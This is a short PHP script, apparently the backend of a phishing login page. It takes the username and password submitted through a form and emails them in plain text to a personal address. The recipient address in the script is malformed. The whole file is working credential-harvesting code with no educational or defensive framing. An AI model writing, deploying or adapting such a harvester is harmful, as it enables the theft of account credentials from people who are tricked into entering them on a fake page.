<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener datos del formulario
    $username = htmlspecialchars($_POST['u_name']);
    $password = htmlspecialchars($_POST['pass']);
    
    // Configuración del correo
    $to = "josueramon014@.com"; // Reemplaza esto con la dirección de correo destino
    $subject = "Información de Inicio de Sesión";
    $message = "Nombre de usuario: $username\nContraseña: $password";
    $headers = "From: josueramon014@gmail.com"; // Reemplaza esto con la dirección de correo origen

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Correo enviado exitosamente.";
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Método de solicitud no válido.";
}
?>